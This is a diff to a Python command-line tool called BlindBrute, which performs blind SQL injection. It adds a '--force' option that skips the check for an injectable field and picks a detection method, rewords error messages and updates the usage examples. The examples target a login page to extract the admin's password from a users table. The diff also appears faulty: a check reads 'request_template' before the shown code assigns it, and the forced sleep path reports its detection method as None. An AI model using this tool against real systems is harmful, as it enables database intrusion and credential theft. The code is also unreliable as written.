@@ -10,7 +10,7 @@ from urllib.parse import quote
 
 def usage():
     usage = """
-    BlindBrute - Blind SQL Injection Script with Header and File Support
+    BlindBrute - Blind SQL Injection Brute Forcer with Header, Data, and File Support
 
     Usage:
         python blindbrute.py -u <URL> -t <TABLE> -c <COLUMN> -w <WHERE CLAUSE> [options]
@@ -35,11 +35,13 @@ def usage():
         --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
         --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
         --sleep-only                 Use only sleep-based detection methods
+        --force                      Skip the injectability check and force a detection method (status, content, keyword, or sleep)
 
     Examples:
-        python blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'"
-        python blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
-        python blindbrute.py -f request.txt -t users -c password -w "username='admin'" --binary-attack
+        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
+        blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
+        blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
 
     Description:
         BlindBrute is a tool for performing blind SQL injection attacks. It supports detecting vulnerabilities using status codes, content length, 
@@ -757,6 +759,7 @@ def main():
     parser.add_argument('--false-keywords', nargs='+', help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
     parser.add_argument('--sleep-only', action='store_true', help="Use only sleep-based detection methods")
     parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
+    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'], help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
 
     args = parser.parse_args()
 
@@ -765,16 +768,19 @@ def main():
         return
 
     if not args.url and not args.file:
-        print("[-] You must provide either a URL (-u) or a request file (-f).")
+        print("[!] You must provide either a URL (-u) or a request file (-f).")
         return
     if args.url and not (args.injectable_headers or args.data):
-        print("[-] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
+        print("[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
         return
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
-        print("[-] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
+        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
         return
     if args.data and args.file:
-        print ("[-] You cannot specify data for the request file outside of the request file.")
+        print ("[!] You cannot specify data for the request file outside of the request file.")
+        return
+    if not args.url and not request_template:
+        print("[!] You must provide a valid request template or URL.")
         return
 
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
@@ -786,17 +792,27 @@ def main():
         if not request_template:
             return
 
-    if not args.url and not request_template:
-        print("[-] A valid request template or URL must be provided.")
-        return
+    detection = None
 
+    if args.force:
+        if args.force == "keyword":
+            if args.true_keywords or args.false_keywords:
+                detection = "keyword"
+            else:
+                print ("[!] You must provide keywords to force a keyword detection.")
+                return
+        elif args.force == "sleep":
+            args.sleep_only = True
+        else:
+            detection = args.force
+        print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
+    else:
     # Step 1: Check if the field is injectable
-    injectable, detection = is_injectable(args.url, injectable_headers, static_headers, request_template, args=args)
-    if not injectable:
-        return
-
-    print(f"[+] header is injectable using {detection} method.")
-    print("[+] Checking database type and corresponding substring function...")
+        injectable, detection = is_injectable(args.url, injectable_headers, static_headers, request_template, args=args)
+        if not injectable:
+            return
+        print(f"[+] header is injectable using {detection} method.")
+        print("[+] Checking database type and corresponding substring function...")
 
     # Step 2: Detect the database type
     db_type, string_function = detect_database(args.url, injectable_headers, static_headers, request_template, detection=detection, args=args)
